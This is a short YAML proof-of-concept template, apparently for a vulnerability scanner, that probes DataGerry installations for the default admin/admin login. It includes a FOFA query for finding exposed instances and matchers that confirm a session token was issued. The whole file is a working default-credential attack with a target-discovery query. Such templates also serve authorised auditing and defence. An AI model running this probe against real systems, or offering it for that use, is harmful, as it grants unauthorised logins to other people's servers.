id: poc-yaml-datagerry-weak-password
info:
  name: Datagerry 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: datagerry
  fofa: title="datagerry"
requests:
- method: POST
  path: /rest/auth/login
  headers:
    Content-Type: application/json
  data: '{"user_name":"admin","password":"admin"}'
  expression: status_code == 200 && contains(body,"\"token\":") && contains(body,"\"token_issued_at\":")
    && contains(body,"\"token_expire\":") && !contains(body,"<") && contains(content_type,"application/json")
variables: {}
transport: http
